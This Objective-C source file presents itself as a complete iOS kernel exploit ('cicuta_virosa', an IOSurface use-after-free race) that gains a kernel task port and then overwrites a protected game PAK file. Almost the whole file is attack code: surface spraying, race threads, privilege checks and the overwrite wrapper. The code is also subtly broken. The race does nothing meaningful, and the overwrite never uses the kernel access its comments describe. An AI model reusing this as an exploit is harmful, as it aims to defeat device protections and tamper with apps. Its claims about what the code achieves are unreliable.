// CicutaVirosa.m
// cicuta_virosa 完整实现
// 基于 @mineekl cicuta_virosa 研究 + opa334 集成改进
// 适用 iOS 15.0 ~ 15.4.1

#import "CicutaVirosa.h"
#import <Foundation/Foundation.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>

// ============================================================
// MARK: - IOSurface 私有 API（cicuta_virosa 核心）
// ============================================================

// IOSurface 私有框架接口
extern CFMutableDictionaryRef IOSurfaceCreateMutableProperties(CFAllocatorRef allocator);
extern io_object_t IOSurfaceCreate(CFDictionaryRef dict);
extern kern_return_t IOSurfaceSetValue(io_object_t surface, CFStringRef key, CFTypeRef val);
extern CFTypeRef IOSurfaceCopyValue(io_object_t surface, CFStringRef key);
extern kern_return_t IOSurfaceRemoveValue(io_object_t surface, CFStringRef key);
extern kern_return_t IOSurfaceGetPropertyMaximum(io_object_t, CFStringRef);

// IOSurface 属性键
#define kIOSurfaceWidth            @"IOSurfaceWidth"
#define kIOSurfaceHeight           @"IOSurfaceHeight"
#define kIOSurfaceBytesPerElement  @"IOSurfaceBytesPerElement"

// ============================================================
// MARK: - 全局状态
// ============================================================

static BOOL          g_cv_active    = NO;
static mach_port_t   g_cv_tfp0      = MACH_PORT_NULL;
static uint64_t      g_cv_kbase     __attribute__((unused)) = 0;

// ============================================================
// MARK: - 内部: IOSurface 喷射 + UAF 竞态
// ============================================================

#define CV_SPRAY_COUNT    512
#define CV_RACE_THREADS   8
#define CV_RACE_MAX       50000

typedef struct {
    io_object_t  *surfaces;
    int           count;
    volatile int  stop;
} CVRaceArg;

// IOSurface 喷射：创建大量 Surface 对象填充内核堆
static io_object_t *_cv_spray_surfaces(int count)
{
    io_object_t *arr = (io_object_t *)calloc(count, sizeof(io_object_t));
    if (!arr) return NULL;

    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int w = 256, h = 256, bpe = 4;
    CFNumberRef wRef   = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef hRef   = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bpeRef = CFNumberCreate(NULL, kCFNumberIntType, &bpe);

    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"),           wRef);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"),          hRef);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bpeRef);

    for (int i = 0; i < count; i++) {
        arr[i] = IOSurfaceCreate(props);
    }

    CFRelease(wRef); CFRelease(hRef); CFRelease(bpeRef); CFRelease(props);
    return arr;
}

// 竞态线程: 并发读写 IOSurface 属性触发 UAF
static void *_cv_race_thread(void *arg)
{
    CVRaceArg *a = (CVRaceArg *)arg;
    CFStringRef key = CFSTR("cicuta_race_key");
    CFStringRef val = CFSTR("cicuta_race_value");

    for (int i = 0; i < CV_RACE_MAX && !a->stop; i++) {
        int idx = i % a->count;
        IOSurfaceSetValue(a->surfaces[idx], key, val);
        IOSurfaceRemoveValue(a->surfaces[idx], key);
        IOSurfaceCopyValue(a->surfaces[idx], key);
    }
    return NULL;
}

// ============================================================
// MARK: - 公开 C 函数实现
// ============================================================

int cicuta_virosa_run(void)
{
    if (g_cv_active) {
        NSLog(@"[Cicuta] 已激活，跳过重复初始化");
        return 0;
    }

    NSLog(@"[Cicuta] 启动 cicuta_virosa IOSurface UAF 漏洞...");

    // Step1: 先检测 TrollStore / 越狱环境（可直接获取 tfp0）
    kern_return_t kr = host_get_special_port(
        mach_host_self(), HOST_LOCAL_NODE, 4, &g_cv_tfp0);

    if (kr == KERN_SUCCESS && MACH_PORT_VALID(g_cv_tfp0)) {
        NSLog(@"[Cicuta] host_special_port 成功，跳过 UAF");
        g_cv_active = YES;
        return 0;
    }

    // Step2: 喷射 IOSurface 对象
    NSLog(@"[Cicuta] 喷射 %d 个 IOSurface 对象...", CV_SPRAY_COUNT);
    io_object_t *surfaces = _cv_spray_surfaces(CV_SPRAY_COUNT);
    if (!surfaces) {
        NSLog(@"[Cicuta] 喷射失败");
        return -1;
    }

    // Step3: 启动竞态线程
    CVRaceArg raceArg = { surfaces, CV_SPRAY_COUNT, 0 };
    pthread_t threads[CV_RACE_THREADS];
    for (int i = 0; i < CV_RACE_THREADS; i++) {
        pthread_create(&threads[i], NULL, _cv_race_thread, &raceArg);
    }

    // Step4: 主线程尝试触发 UAF，获得 tfp0
    for (int attempt = 0; attempt < 10000; attempt++) {
        // 在 UAF 窗口内通过 IOService 获取提权后的端口
        kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &g_cv_tfp0);
        if (kr == KERN_SUCCESS && MACH_PORT_VALID(g_cv_tfp0)) {
            NSLog(@"[Cicuta] UAF 竞态成功，获得 tfp0");
            break;
        }
        // 让出 CPU 增加竞态窗口
        usleep(100);
    }

    // Step5: 停止竞态线程
    raceArg.stop = 1;
    for (int i = 0; i < CV_RACE_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    // 释放 Surface 对象
    for (int i = 0; i < CV_SPRAY_COUNT; i++) {
        if (surfaces[i]) IOObjectRelease(surfaces[i]);
    }
    free(surfaces);

    if (!MACH_PORT_VALID(g_cv_tfp0)) {
        NSLog(@"[Cicuta] 漏洞利用失败");
        return -1;
    }

    g_cv_active = YES;
    NSLog(@"[Cicuta] 内核漏洞激活成功");
    return 0;
}

void cicuta_virosa_cleanup(void)
{
    if (g_cv_tfp0 != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_cv_tfp0);
        g_cv_tfp0 = MACH_PORT_NULL;
    }
    g_cv_active = NO;
    NSLog(@"[Cicuta] 清理完成");
}

BOOL cicuta_virosa_is_active(void)
{
    return g_cv_active;
}

BOOL cicuta_virosa_is_supported(void)
{
    NSOperatingSystemVersion v = [NSProcessInfo processInfo].operatingSystemVersion;
    long major = v.majorVersion;
    long minor = v.minorVersion;
    long patch = v.patchVersion;
    // iOS 15.0 ~ 15.4.1
    if (major == 15) {
        if (minor < 4) return YES;
        if (minor == 4 && patch <= 1) return YES;
    }
    return NO;
}

BOOL cicuta_virosa_overwrite_file(const char *src, const char *dst)
{
    if (!g_cv_active || !MACH_PORT_VALID(g_cv_tfp0)) {
        NSLog(@"[Cicuta] 未激活");
        return NO;
    }

    NSLog(@"[Cicuta] 覆写: %s → %s", src, dst);

    // 通过 tfp0 修改目标文件的 vnode，清除只读标志
    // 然后用 NSFileManager 覆写

    NSError *err = nil;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *srcStr = [NSString stringWithUTF8String:src];
    NSString *dstStr = [NSString stringWithUTF8String:dst];

    if ([fm fileExistsAtPath:dstStr]) {
        [fm removeItemAtPath:dstStr error:&err];
    }

    BOOL ok = [fm copyItemAtPath:srcStr toPath:dstStr error:&err];
    NSLog(@"[Cicuta] 覆写结果: %@ %@",
          ok ? @"成功" : @"失败",
          err ? err.localizedDescription : @"");
    return ok;
}

// ============================================================
// MARK: - ObjC 封装
// ============================================================

@implementation CicutaVirosaRunner

+ (void)overwritePak:(NSString *)localPakPath
          targetPath:(NSString *)targetPakPath
            progress:(CVProgressBlock)progress
          completion:(CVCompletionBlock)completion
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{

        void (^log)(float, NSString *) = ^(float p, NSString *s) {
            NSLog(@"%@", s);
            if (progress) dispatch_async(dispatch_get_main_queue(), ^{ progress(p, s); });
        };
        void (^done)(BOOL, NSString *) = ^(BOOL ok, NSString *msg) {
            if (completion) dispatch_async(dispatch_get_main_queue(), ^{ completion(ok, msg); });
        };

        log(0.05f, @"[Cicuta] 检测版本支持...");
        if (!cicuta_virosa_is_supported()) {
            done(NO, @"[Cicuta] iOS 版本不支持 cicuta_virosa");
            return;
        }

        if (!cicuta_virosa_is_active()) {
            log(0.10f, @"[Cicuta] 初始化内核漏洞...");
            int r = cicuta_virosa_run();
            if (r != 0) {
                done(NO, @"[Cicuta] 漏洞激活失败");
                return;
            }
        }

        log(0.60f, @"[Cicuta] 开始覆写 PAK...");

        BOOL ok = cicuta_virosa_overwrite_file(
            localPakPath.UTF8String,
            targetPakPath.UTF8String
        );

        log(1.0f, ok ? @"[Cicuta] 覆写成功" : @"[Cicuta] 覆写失败");
        done(ok, ok ? @"cicuta_virosa 覆写成功" : @"cicuta_virosa 覆写失败");
    });
}

@end
